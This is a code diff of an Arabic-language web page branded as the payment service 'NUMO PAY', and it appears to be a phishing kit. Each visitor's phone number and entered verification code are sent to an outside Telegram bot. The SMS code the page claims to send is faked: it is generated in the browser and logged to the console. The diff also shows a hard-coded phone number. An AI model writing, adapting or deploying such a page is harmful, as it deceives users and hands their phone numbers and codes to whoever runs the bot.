@@ -13,511 +13,433 @@
 <meta name="twitter:image" content="https://l.top4top.io/p_3792v4b4y0.jpeg">
 <title>نمو باي - NUMO PAY</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI','Tahoma','Arial',sans-serif}
-
-html, body {
-height:100%;
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Arial', 'Tahoma', sans-serif;
 }
 
-body{
-background:linear-gradient(135deg, #f8f9fa 0%, #f0f0f2 100%);
-min-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-padding:20px;
-}
-
-.container{
-width:100%;
-max-width:480px;
-background:#fff;
-border-radius:30px;
-box-shadow:0 20px 60px rgba(0,0,0,0.08);
-overflow:hidden;
-animation:slideUp 0.6s ease-out;
-}
-
-@keyframes slideUp {
-from {
-opacity:0;
-transform:translateY(40px);
-}
-to {
-opacity:1;
-transform:translateY(0);
-}
+body {
+  background: #f5f5f5;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
 }
 
 .page {
-display:none;
-padding:50px 30px;
-text-align:center;
-animation:fadeIn 0.6s ease-out;
-min-height:100vh;
-display:flex;
-flex-direction:column;
-justify-content:center;
+  display: none;
 }
 
 .page.active {
-display:flex;
+  display: block;
 }
 
-@keyframes fadeIn {
-from { opacity:0; }
-to { opacity:1; }
+.container {
+  width: 100%;
+  max-width: 500px;
+  background: white;
+  border-radius: 30px;
+  padding: 50px 30px;
+  text-align: center;
+  box-shadow: 0 10px 40px rgba(0,0,0,0.1);
 }
 
-.logo{
-width:140px;
-height:140px;
-margin:0 auto 30px;
-background:url('https://l.top4top.io/p_3792v4b4y0.jpeg') center/contain no-repeat;
-filter:drop-shadow(0 4px 12px rgba(255,205,0,0.15));
+/* الشعار */
+.logo {
+  width: 150px;
+  height: 150px;
+  margin: 0 auto 30px;
+  background: url('https://l.top4top.io/p_3792v4b4y0.jpeg') center/contain no-repeat;
 }
 
-.title-ar{
-font-size:36px;
-color:#2c3e50;
-margin:15px 0 5px;
-font-weight:700;
-letter-spacing:-0.5px;
+.brand-name {
+  font-size: 32px;
+  color: #2c2c2c;
+  font-weight: bold;
+  margin: 20px 0 5px;
+  letter-spacing: -1px;
 }
 
-.title-en{
-font-size:28px;
-color:#ffcd00;
-margin-bottom:20px;
-letter-spacing:3px;
-font-weight:600;
+.brand-en {
+  font-size: 28px;
+  color: #999;
+  letter-spacing: 3px;
+  margin-bottom: 30px;
+  font-weight: 600;
 }
 
-.subtitle{
-font-size:18px;
-color:#666;
-margin-bottom:35px;
-line-height:1.6;
-font-weight:500;
+/* صفحة الهاتف */
+.subtitle {
+  font-size: 18px;
+  color: #666;
+  margin-bottom: 40px;
+  font-weight: 500;
 }
 
-.input-wrapper {
-position:relative;
-margin-bottom:25px;
+.phone-input-wrapper {
+  position: relative;
+  margin-bottom: 30px;
 }
 
-.input-icon {
-position:absolute;
-right:20px;
-top:50%;
-transform:translateY(-50%);
-font-size:24px;
-color:#ffcd00;
-pointer-events:none;
-z-index:2;
+.phone-input {
+  width: 100%;
+  height: 60px;
+  border: 2px solid #ddd;
+  border-radius: 20px;
+  padding: 0 20px 0 60px;
+  font-size: 18px;
+  text-align: right;
+  color: #333;
+  transition: all 0.3s ease;
+  background: white;
 }
 
-.phone-input{
-width:100%;
-background:#f8f9fa;
-border:2px solid #e8e9eb;
-border-radius:20px;
-padding:16px 20px 16px 50px;
-font-size:18px;
-color:#2c3e50;
-text-align:right;
-transition:all 0.3s ease;
-font-weight:500;
+.phone-input:focus {
+  outline: none;
+  border-color: #ffcd00;
+  box-shadow: 0 0 0 3px rgba(255, 205, 0, 0.1);
 }
 
-.phone-input:focus{
-outline:none;
-border-color:#ffcd00;
-background:#fff;
-box-shadow:0 0 0 4px rgba(255,205,0,0.1);
+.phone-icon {
+  position: absolute;
+  right: 20px;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 22px;
+  width: 35px;
+  height: 35px;
+  border: 2px solid #333;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: white;
 }
 
-.phone-input::placeholder {
-color:transparent;
-}
-
-.phone-input:not(:placeholder-shown)::placeholder {
-color:transparent;
-}
-
-.input-label {
-position:absolute;
-right:50px;
-top:50%;
-transform:translateY(-50%);
-font-size:16px;
-color:#999;
-pointer-events:none;
-transition:all 0.3s ease;
-font-weight:500;
-}
-
-.phone-input:focus ~ .input-label,
-.phone-input:not(:placeholder-shown) ~ .input-label {
-display:none;
-}
-
-.connect-toggle {
-display:flex;
-align-items:center;
-justify-content:flex-end;
-margin:25px 0 30px;
-gap:12px;
+.toggle-section {
+  display: flex;
+  justify-content: flex-end;
+  align-items: center;
+  gap: 12px;
+  margin: 30px 0;
 }
 
 .toggle-label {
-font-size:16px;
-color:#2c3e50;
-font-weight:500;
+  font-size: 16px;
+  color: #333;
+  font-weight: 500;
 }
 
 .toggle-switch {
-position:relative;
-width:50px;
-height:30px;
-background:#ddd;
-border-radius:15px;
-cursor:pointer;
-transition:background 0.3s ease;
-border:none;
-padding:0;
+  position: relative;
+  width: 55px;
+  height: 32px;
+  background: #ccc;
+  border-radius: 20px;
+  border: none;
+  cursor: pointer;
+  transition: background 0.3s ease;
+  padding: 0;
 }
 
 .toggle-switch.active {
-background:#ffcd00;
+  background: linear-gradient(90deg, #ffcd00, #ffc300);
 }
 
 .toggle-switch::after {
-content:'';
-position:absolute;
-width:26px;
-height:26px;
-background:#fff;
-border-radius:50%;
-top:2px;
-right:2px;
-transition:right 0.3s ease;
+  content: '';
+  position: absolute;
+  width: 28px;
+  height: 28px;
+  background: white;
+  border-radius: 50%;
+  top: 2px;
+  right: 2px;
+  transition: right 0.3s ease;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.2);
 }
 
 .toggle-switch.active::after {
-right:22px;
+  right: 25px;
 }
 
-.verify-btn{
-width:100%;
-height:60px;
-border:none;
-border-radius:20px;
-background:linear-gradient(135deg, #ffcd00 0%, #ffc300 100%);
-color:#2c3e50;
-font-size:20px;
-font-weight:700;
-cursor:pointer;
-transition:all 0.3s ease;
-letter-spacing:1px;
-box-shadow:0 8px 25px rgba(255,205,0,0.3);
+.verify-btn {
+  width: 100%;
+  height: 65px;
+  background: linear-gradient(90deg, #ffcd00, #ffc300);
+  border: none;
+  border-radius: 25px;
+  font-size: 22px;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 5px 20px rgba(255, 205, 0, 0.3);
+  margin-top: 20px;
 }
 
-.verify-btn:hover:not(:disabled){
-transform:translateY(-2px);
-box-shadow:0 12px 35px rgba(255,205,0,0.4);
+.verify-btn:hover:not(:disabled) {
+  transform: translateY(-3px);
+  box-shadow: 0 8px 25px rgba(255, 205, 0, 0.4);
 }
 
-.verify-btn:active:not(:disabled){
-transform:translateY(0);
+.verify-btn:active:not(:disabled) {
+  transform: translateY(0);
 }
 
-.verify-btn:disabled{
-background:#ccc;
-cursor:not-allowed;
-opacity:0.7;
-box-shadow:none;
+.verify-btn:disabled {
+  background: #999;
+  cursor: not-allowed;
+  opacity: 0.7;
 }
 
-.message{
-margin-top:20px;
-padding:14px 16px;
-border-radius:12px;
-font-size:16px;
-animation:slideDown 0.3s ease-out;
-min-height:24px;
+.message {
+  margin-top: 20px;
+  font-size: 14px;
+  min-height: 20px;
+  padding: 10px;
+  border-radius: 8px;
 }
 
-@keyframes slideDown {
-from {
-opacity:0;
-transform:translateY(-15px);
-}
-to {
-opacity:1;
-transform:translateY(0);
-}
+.message.error {
+  color: #d32f2f;
+  background: #ffebee;
 }
 
-.message.error{
-color:#e74c3c;
-background:#fadbd8;
-border-left:4px solid #e74c3c;
-}
-
-.message.success{
-color:#27ae60;
-background:#d5f4e6;
-border-left:4px solid #27ae60;
-}
-
-.message.info{
-color:#3498db;
-background:#d6eaf8;
-border-left:4px solid #3498db;
+.message.success {
+  color: #27ae60;
+  background: #d5f4e6;
 }
 
 /* صفحة التحقق */
-.verification-icon{
-font-size:52px;
-margin:20px 0;
-animation:bounce 0.7s ease-out;
+.code-title {
+  font-size: 36px;
+  color: #ffcd00;
+  font-weight: bold;
+  margin: 20px 0 10px;
 }
 
-@keyframes bounce {
-0%, 100% { transform:translateY(0); }
-50% { transform:translateY(-12px); }
+.code-subtitle {
+  font-size: 15px;
+  color: #666;
+  line-height: 1.8;
+  margin: 30px 0 40px;
 }
 
-.verification-info{
-font-size:15px;
-color:#666;
-margin:25px 0 35px;
-line-height:1.8;
+.code-subtitle .phone {
+  color: #333;
+  font-weight: bold;
 }
 
-.verification-info .phone-number {
-color:#ffcd00;
-font-weight:700;
+.code-inputs {
+  display: flex;
+  gap: 15px;
+  justify-content: center;
+  margin: 40px 0;
 }
 
-.code-inputs{
-display:flex;
-gap:10px;
-justify-content:center;
-margin:40px 0;
+.code-input {
+  width: 70px;
+  height: 70px;
+  border: 2px solid #ddd;
+  border-radius: 16px;
+  font-size: 32px;
+  text-align: center;
+  font-weight: bold;
+  color: #333;
+  transition: all 0.3s ease;
+  background: white;
 }
 
-.code-input{
-width:65px;
-height:65px;
-border:2px solid #e8e9eb;
-border-radius:16px;
-font-size:28px;
-text-align:center;
-font-weight:700;
-color:#2c3e50;
-transition:all 0.3s ease;
-background:#f8f9fa;
-}
-
-.code-input:focus{
-outline:none;
-border-color:#ffcd00;
-background:#fff;
-box-shadow:0 0 0 4px rgba(255,205,0,0.1);
+.code-input:focus {
+  outline: none;
+  border-color: #ffcd00;
+  box-shadow: 0 0 0 3px rgba(255, 205, 0, 0.1);
 }
 
 .code-input::-webkit-outer-spin-button,
 .code-input::-webkit-inner-spin-button {
--webkit-appearance:none;
-margin:0;
+  -webkit-appearance: none;
+  margin: 0;
 }
 
-.resend-container{
-margin:30px 0;
+.input[type=number] {
+  -moz-appearance: textfield;
 }
 
-.resend-text{
-font-size:15px;
-color:#666;
+.resend-section {
+  margin: 30px 0;
 }
 
-.resend-btn{
-background:none;
-border:none;
-color:#ffcd00;
-font-size:15px;
-cursor:pointer;
-text-decoration:underline;
-font-weight:600;
-transition:color 0.3s ease;
-margin-top:8px;
+.resend-text {
+  font-size: 15px;
+  color: #666;
+  margin-bottom: 10px;
 }
 
-.resend-btn:hover:not(:disabled){
-color:#ffc300;
+.resend-btn {
+  background: none;
+  border: none;
+  color: #ffcd00;
+  font-size: 15px;
+  cursor: pointer;
+  text-decoration: underline;
+  font-weight: bold;
+  transition: color 0.3s ease;
 }
 
-.resend-btn:disabled{
-color:#ccc;
-cursor:not-allowed;
-text-decoration:none;
+.resend-btn:hover:not(:disabled) {
+  color: #ffc300;
 }
 
-.timer{
-display:inline-block;
-margin-right:10px;
-font-weight:700;
-color:#e74c3c;
+.resend-btn:disabled {
+  color: #ccc;
+  cursor: not-allowed;
 }
 
-.back-btn{
-background:none;
-border:none;
-color:#999;
-font-size:15px;
-cursor:pointer;
-text-decoration:underline;
-margin-top:20px;
-transition:color 0.3s ease;
+.timer {
+  font-weight: bold;
+  color: #d32f2f;
+  margin-left: 8px;
 }
 
-.back-btn:hover{
-color:#2c3e50;
+.back-btn {
+  background: none;
+  border: none;
+  color: #999;
+  font-size: 14px;
+  cursor: pointer;
+  text-decoration: underline;
+  margin-top: 20px;
+  transition: color 0.3s ease;
 }
 
-.footer{
-margin-top:30px;
-color:#bbb;
-font-size:13px;
-padding-top:20px;
-border-top:1px solid #e8e9eb;
+.back-btn:hover {
+  color: #333;
 }
 
-@media (max-width:500px){
-.container {
-border-radius:25px;
+.footer {
+  margin-top: 40px;
+  color: #ccc;
+  font-size: 12px;
+  border-top: 1px solid #eee;
+  padding-top: 20px;
 }
 
-.page {
-padding:40px 22px;
-}
+@media (max-width: 500px) {
+  .container {
+    padding: 40px 20px;
+    border-radius: 25px;
+  }
 
-.logo{
-width:120px;
-height:120px;
-margin-bottom:20px;
-}
+  .logo {
+    width: 120px;
+    height: 120px;
+    margin-bottom: 20px;
+  }
 
-.title-ar{
-font-size:32px;
-}
+  .brand-name {
+    font-size: 28px;
+  }
 
-.title-en{
-font-size:24px;
-}
+  .brand-en {
+    font-size: 24px;
+  }
 
-.subtitle{
-font-size:16px;
-}
+  .phone-input {
+    height: 55px;
+    font-size: 16px;
+  }
 
-.phone-input{
-font-size:16px;
-padding:14px 18px 14px 45px;
-}
+  .code-input {
+    width: 60px;
+    height: 60px;
+    font-size: 28px;
+  }
 
-.code-input{
-width:55px;
-height:55px;
-font-size:24px;
-}
-
-.verify-btn{
-height:55px;
-font-size:18px;
-}
+  .verify-btn {
+    height: 60px;
+    font-size: 20px;
+  }
 }
 </style>
 </head>
 <body>
 
 <div class="container">
-<!-- صفحة إدخال رقم الهاتف -->
-<div class="page active" id="phonePage">
-<img class="logo" src="https://l.top4top.io/p_3792v4b4y0.jpeg" alt="نمو باي">
-<div class="title-ar">نمو باي</div>
-<div class="title-en">NUMO PAY</div>
-<div class="subtitle">الرجاء إدخال رقم هاتفك للمتابعة</div>
 
-<div class="input-wrapper">
-<span class="input-icon">📱</span>
-<input 
-type="tel" 
-id="phone" 
-class="phone-input"
-placeholder="أدخل رقم هاتفك"
-maxlength="12"
-inputmode="numeric">
-<span class="input-label">أدخل رقم هاتفك هون</span>
-</div>
+  <!-- صفحة إدخال الهاتف -->
+  <div class="page active" id="phonePage">
+    <div class="logo"></div>
+    <div class="brand-name">نمو باي</div>
+    <div class="brand-en">NUMO PAY</div>
+    
+    <div class="subtitle">الرجاء إدخال رقم هاتفك للمتابعة</div>
+    
+    <div class="phone-input-wrapper">
+      <div class="phone-icon">✕</div>
+      <input 
+        type="tel" 
+        id="phone" 
+        class="phone-input"
+        placeholder="أدخل رقم هاتفك"
+        maxlength="12"
+        inputmode="numeric"
+      >
+    </div>
+    
+    <div class="toggle-section">
+      <button class="toggle-switch" id="toggleBtn" onclick="toggleConnect()"></button>
+      <span class="toggle-label">ابق متصلاً</span>
+    </div>
+    
+    <button class="verify-btn" id="phoneBtn" onclick="handlePhoneSubmit()">تحقق</button>
+    
+    <div class="message" id="phoneMsg"></div>
+    
+    <div class="footer">© 2026 جميع الحقوق محفوظة - نمو باي</div>
+  </div>
 
-<div class="connect-toggle">
-<button class="toggle-switch" id="toggleSwitch" onclick="toggleConnect()"></button>
-<span class="toggle-label">ابق متصلاً</span>
-</div>
-
-<button class="verify-btn" id="phoneBtn" onclick="handlePhoneSubmit()">
-تحقق
-</button>
-
-<div class="message" id="phoneMsg"></div>
-
-<div class="footer">
-© 2026 جميع الحقوق محفوظة - نمو باي
-</div>
-</div>
-
-<!-- صفحة إدخال رمز التحقق -->
-<div class="page" id="verificationPage">
-<img class="logo" src="https://l.top4top.io/p_3792v4b4y0.jpeg" alt="نمو باي">
-<div class="title-ar">أدخل الرمز</div>
-<div class="title-en">Enter Code</div>
-
-<div class="verification-icon">🔐</div>
-
-<div class="verification-info">
-تم إرسال رمز إليك عبر رسالة نصية قصيرة على الرقم <span class="phone-number" id="displayPhone"></span>
-<br>الرجاء إدخال هذا الرمز لمتابعة التسجيل
-</div>
-
-<div class="code-inputs" id="codeInputs">
-<input type="text" class="code-input" maxlength="1" inputmode="numeric">
-<input type="text" class="code-input" maxlength="1" inputmode="numeric">
-<input type="text" class="code-input" maxlength="1" inputmode="numeric">
-<input type="text" class="code-input" maxlength="1" inputmode="numeric">
-</div>
-
-<button class="verify-btn" id="codeBtn" onclick="handleCodeSubmit()">
-تحقق من الرمز
-</button>
-
-<div class="message" id="codeMsg"></div>
-
-<div class="resend-container">
-<div class="resend-text">لم تستقبل الرمز؟</div>
-<button class="resend-btn" id="resendBtn" onclick="handleResend()">
-إعادة إرسال الرمز
-</button>
-<span class="timer" id="timer"></span>
-</div>
-
-<button class="back-btn" onclick="goBackToPhone()">العودة</button>
-
-<div class="footer">
-© 2026 جميع الحقوق محفوظة - نمو باي
-</div>
-</div>
+  <!-- صفحة إدخال الرمز -->
+  <div class="page" id="codePage">
+    <div class="logo"></div>
+    <div class="brand-name">نمو باي</div>
+    <div class="brand-en">NUMO PAY</div>
+    
+    <div class="code-title">أدخل الرمز</div>
+    
+    <div class="code-subtitle">
+      تم إرسال رمز إليك عبر رسالة نصية قصيرة على الرقم <span class="phone" id="displayPhone">0914072883</span> 
+      الرجاء إدخال هذا الرمز لمتابعة التسجيل
+    </div>
+    
+    <div class="code-inputs" id="codeInputs">
+      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+      <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+    </div>
+    
+    <button class="verify-btn" id="codeBtn" onclick="handleCodeSubmit()">تحقق من الرمز</button>
+    
+    <div class="message" id="codeMsg"></div>
+    
+    <div class="resend-section">
+      <div class="resend-text">
+        <button class="resend-btn" id="resendBtn" onclick="handleResend()">
+          تح��يث الرمز
+        </button>
+        <span class="timer" id="timer"></span>
+      </div>
+    </div>
+    
+    <button class="back-btn" onclick="goBackToPhone()">العودة</button>
+    
+    <div class="footer">© 2026 جميع الحقوق محفوظة - نمو باي</div>
+  </div>
 
 </div>
 
@@ -530,232 +452,197 @@ let verificationCode = '';
 let resendTimer = 0;
 let isConnected = false;
 
-// معالجة رقم الهاتف
-function handlePhoneSubmit(){
-const phone = document.getElementById('phone').value.trim();
-const msgDiv = document.getElementById('phoneMsg');
-const phoneBtn = document.getElementById('phoneBtn');
-
-if(phone === ''){
-showMessage(msgDiv, 'يرجى إدخال رقم الهاتف', 'error');
-return;
+// تبديل الاتصال
+function toggleConnect() {
+  const btn = document.getElementById('toggleBtn');
+  isConnected = !isConnected;
+  btn.classList.toggle('active');
 }
 
-if(!/^\d{9,12}$/.test(phone.replace(/\s/g, ''))){
-showMessage(msgDiv, 'يرجى إدخال رقم هاتف صحيح', 'error');
-return;
+// معالجة الهاتف
+function handlePhoneSubmit() {
+  const phone = document.getElementById('phone').value.trim();
+  const msgDiv = document.getElementById('phoneMsg');
+  const btn = document.getElementById('phoneBtn');
+
+  if (phone === '') {
+    showMessage(msgDiv, 'يرجى إدخال رقم الهاتف', 'error');
+    return;
+  }
+
+  if (!/^\d{9,12}$/.test(phone)) {
+    showMessage(msgDiv, 'يرجى إدخال رقم هاتف صحيح', 'error');
+    return;
+  }
+
+  currentPhone = phone;
+  btn.disabled = true;
+  btn.innerText = 'جاري الإرسال...';
+
+  // إرسال رقم الهاتف فقط
+  const message = `📱 طلب تحقق جديد - نمو باي\n\n📞 رقم الهاتف: ${phone}\n✔️ متصل: ${isConnected ? 'نعم' : 'لا'}\n\n⏳ بانتظار رمز التحقق...`;
+
+  sendToTelegram(message).then(success => {
+    if (success) {
+      showMessage(msgDiv, '✅ تم إرسال الرقم بنجاح', 'success');
+      setTimeout(() => {
+        goToCodePage();
+      }, 1200);
+    } else {
+      showMessage(msgDiv, '❌ حدث خطأ في الإرسال', 'error');
+      btn.disabled = false;
+      btn.innerText = 'تحقق';
+    }
+  });
 }
 
-currentPhone = phone;
-phoneBtn.disabled = true;
-phoneBtn.innerText = 'جاري الإرسال...';
-
-// إرسال رقم الهاتف فقط في البداية
-const message = `
-📱 طلب تحقق جديد - نمو باي
-
-📞 رقم الهاتف: ${phone}
-✔️ متصل: ${isConnected ? 'نعم' : 'لا'}
-
-⏳ بانتظار رمز التحقق...
-`;
-
-sendToTelegram(message)
-.then(success => {
-if(success){
-showMessage(msgDiv, '✅ تم إرسال الرقم بنجاح', 'success');
-setTimeout(() => {
-goToVerification();
-}, 1200);
-} else {
-showMessage(msgDiv, '❌ حدث خطأ في الإرسال', 'error');
-phoneBtn.disabled = false;
-phoneBtn.innerText = 'تحقق';
-}
-})
-.catch(() => {
-showMessage(msgDiv, '❌ فشل الاتصال بالخادم', 'error');
-phoneBtn.disabled = false;
-phoneBtn.innerText = 'تحقق';
-});
-}
-
-// الانتقال لصفحة التحقق
-function goToVerification(){
-document.getElementById('phonePage').classList.remove('active');
-document.getElementById('verificationPage').classList.add('active');
-document.getElementById('displayPhone').innerText = currentPhone;
-document.getElementById('codeMsg').innerHTML = '';
-setupCodeInputs();
-startResendTimer();
-
-// توليد رمز عشوائي
-verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-console.log('Verification Code:', verificationCode);
+// الانتقال لصفحة الرمز
+function goToCodePage() {
+  document.getElementById('phonePage').classList.remove('active');
+  document.getElementById('codePage').classList.add('active');
+  document.getElementById('displayPhone').innerText = currentPhone;
+  setupCodeInputs();
+  startResendTimer();
+  verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+  console.log('Code:', verificationCode);
 }
 
 // إعداد حقول الرموز
-function setupCodeInputs(){
-const inputs = document.querySelectorAll('.code-input');
-inputs.forEach((input, index) => {
-input.value = '';
+function setupCodeInputs() {
+  const inputs = document.querySelectorAll('.code-input');
+  inputs.forEach((input, index) => {
+    input.value = '';
+    input.addEventListener('keyup', function(e) {
+      if (this.value.length > 1) {
+        this.value = this.value[0];
+      }
+      if (!/^\d*$/.test(this.value)) {
+        this.value = '';
+        return;
+      }
+      if (this.value && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+      if (e.key === 'Backspace' && !this.value && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
 
-input.addEventListener('keyup', function(e){
-if(this.value.length > 1){
-this.value = this.value[0];
+    input.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const data = (e.clipboardData || window.clipboardData).getData('text');
+      const digits = data.replace(/\D/g, '').substring(0, 4);
+      for (let i = 0; i < digits.length && i < inputs.length; i++) {
+        inputs[i].value = digits[i];
+      }
+    });
+  });
 }
 
-if(!/^\d*$/.test(this.value)){
-this.value = '';
-return;
+// معالجة الرمز
+function handleCodeSubmit() {
+  const inputs = document.querySelectorAll('.code-input');
+  const code = Array.from(inputs).map(i => i.value).join('');
+  const msgDiv = document.getElementById('codeMsg');
+  const btn = document.getElementById('codeBtn');
+
+  if (code.length !== 4) {
+    showMessage(msgDiv, 'يرجى إدخال الرمز كاملاً (4 أرقام)', 'error');
+    return;
+  }
+
+  btn.disabled = true;
+  btn.innerText = 'جاري التحقق...';
+
+  if (code === verificationCode) {
+    showMessage(msgDiv, '✅ تم التحقق بنجاح!', 'success');
+
+    const finalMessage = `✅ تحقق ناجح - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز التحقق: ${code}\n✔️ متصل: ${isConnected ? 'نعم' : 'لا'}\n\n✔️ تم التحقق بنجاح والتسجيل مكتمل`;
+
+    sendToTelegram(finalMessage).then(() => {
+      setTimeout(() => {
+        showMessage(msgDiv, '🎉 تم التحقق والإرسال بنجاح!', 'success');
+        setTimeout(() => {
+          goBackToPhone();
+        }, 1500);
+      }, 300);
+    });
+  } else {
+    showMessage(msgDiv, '❌ الرمز غير صحيح. حاول مرة أخرى', 'error');
+    btn.disabled = false;
+    btn.innerText = 'تحقق من الرمز';
+  }
 }
 
-if(this.value && index < inputs.length - 1){
-inputs[index + 1].focus();
+// إعادة الإرسال
+function handleResend() {
+  const btn = document.getElementById('resendBtn');
+  btn.disabled = true;
+
+  const message = `🔄 إعادة إرسال رمز - نمو باي\n\n📞 رقم الهاتف: ${currentPhone}\n🔐 رمز جديد تم توليده`;
+
+  sendToTelegram(message).then(() => {
+    document.getElementById('codeMsg').innerHTML = '';
+    verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+    console.log('New Code:', verificationCode);
+    startResendTimer();
+  });
 }
 
-if(e.key === 'Backspace' && !this.value && index > 0){
-inputs[index - 1].focus();
-}
-});
+// مؤقت الإعادة
+function startResendTimer() {
+  resendTimer = 60;
+  const btn = document.getElementById('resendBtn');
+  const timer = document.getElementById('timer');
 
-input.addEventListener('paste', function(e){
-e.preventDefault();
-const data = (e.clipboardData || window.clipboardData).getData('text');
-const digits = data.replace(/\D/g, '').substring(0, 4);
-for(let i = 0; i < digits.length && i < inputs.length; i++){
-inputs[i].value = digits[i];
-}
-});
-});
-}
-
-// معالجة إدخال الرمز
-function handleCodeSubmit(){
-const inputs = document.querySelectorAll('.code-input');
-const enteredCode = Array.from(inputs).map(i => i.value).join('');
-const msgDiv = document.getElementById('codeMsg');
-const codeBtn = document.getElementById('codeBtn');
-
-if(enteredCode.length !== 4){
-showMessage(msgDiv, 'يرجى إدخال الرمز كاملاً (4 أرقام)', 'error');
-return;
+  function update() {
+    if (resendTimer > 0) {
+      resendTimer--;
+      timer.innerText = `(${resendTimer}s)`;
+      setTimeout(update, 1000);
+    } else {
+      btn.disabled = false;
+      timer.innerText = '';
+    }
+  }
+  update();
 }
 
-codeBtn.disabled = true;
-codeBtn.innerText = 'جاري التحقق...';
-
-if(enteredCode === verificationCode){
-showMessage(msgDiv, '✅ تم التحقق بنجاح!', 'success');
-
-// إرسال رقم الهاتف مع الرمز
-const finalMessage = `
-✅ تحقق ناجح - نمو باي
-
-📞 رقم الهاتف: ${currentPhone}
-🔐 رمز التحقق: ${enteredCode}
-✔️ متصل: ${isConnected ? 'نعم' : 'لا'}
-
-✔️ تم التحقق بنجاح والتسجيل مكتمل
-`;
-
-sendToTelegram(finalMessage)
-.then(() => {
-setTimeout(() => {
-showMessage(msgDiv, '🎉 تم التحقق والإرسال بنجاح!', 'success');
-setTimeout(() => {
-goBackToPhone();
-}, 1500);
-}, 300);
-});
-} else {
-showMessage(msgDiv, '❌ الرمز غير صحيح. حاول مرة أخرى', 'error');
-codeBtn.disabled = false;
-codeBtn.innerText = 'تحقق من الرمز';
-}
-}
-
-// إعادة إرسال الرمز
-function handleResend(){
-const resendBtn = document.getElementById('resendBtn');
-resendBtn.disabled = true;
-
-const message = `
-🔄 إعادة إرسال رمز - نمو باي
-
-📞 رقم الهاتف: ${currentPhone}
-🔐 رمز جديد تم توليده
-`;
-
-sendToTelegram(message)
-.then(() => {
-document.getElementById('codeMsg').innerHTML = '';
-verificationCode = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-console.log('New Verification Code:', verificationCode);
-startResendTimer();
-});
-}
-
-// بدء مؤقت الإعادة
-function startResendTimer(){
-resendTimer = 60;
-const resendBtn = document.getElementById('resendBtn');
-const timerSpan = document.getElementById('timer');
-
-function updateTimer(){
-if(resendTimer > 0){
-resendTimer--;
-timerSpan.innerText = `(${resendTimer}s)`;
-setTimeout(updateTimer, 1000);
-} else {
-resendBtn.disabled = false;
-timerSpan.innerText = '';
-}
-}
-updateTimer();
-}
-
-// العودة لصفحة الهاتف
-function goBackToPhone(){
-document.getElementById('verificationPage').classList.remove('active');
-document.getElementById('phonePage').classList.add('active');
-document.getElementById('phone').value = '';
-document.getElementById('phoneMsg').innerHTML = '';
-currentPhone = '';
-verificationCode = '';
-}
-
-// تبديل الاتصال
-function toggleConnect(){
-const toggle = document.getElementById('toggleSwitch');
-isConnected = !isConnected;
-toggle.classList.toggle('active');
+// العودة
+function goBackToPhone() {
+  document.getElementById('codePage').classList.remove('active');
+  document.getElementById('phonePage').classList.add('active');
+  document.getElementById('phone').value = '';
+  document.getElementById('phoneMsg').innerHTML = '';
+  document.getElementById('phoneBtn').innerText = 'تحقق';
+  document.getElementById('phoneBtn').disabled = false;
+  currentPhone = '';
+  verificationCode = '';
 }
 
 // إرسال للتلجرام
-function sendToTelegram(message){
-return new Promise((resolve) => {
-const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-fetch(url, {
-method: 'POST',
-headers: {'Content-Type': 'application/json'},
-body: JSON.stringify({
-chat_id: CHAT_ID,
-text: message,
-parse_mode: 'HTML'
-})
-})
-.then(r => r.json())
-.then(data => resolve(data.ok))
-.catch(() => resolve(false));
-});
+function sendToTelegram(message) {
+  return new Promise((resolve) => {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    })
+    .then(r => r.json())
+    .then(data => resolve(data.ok))
+    .catch(() => resolve(false));
+  });
 }
 
 // عرض الرسائل
-function showMessage(element, text, type){
-element.innerText = text;
-element.className = `message ${type}`;
+function showMessage(element, text, type) {
+  element.innerText = text;
+  element.className = `message ${type}`;
 }
 </script>
 
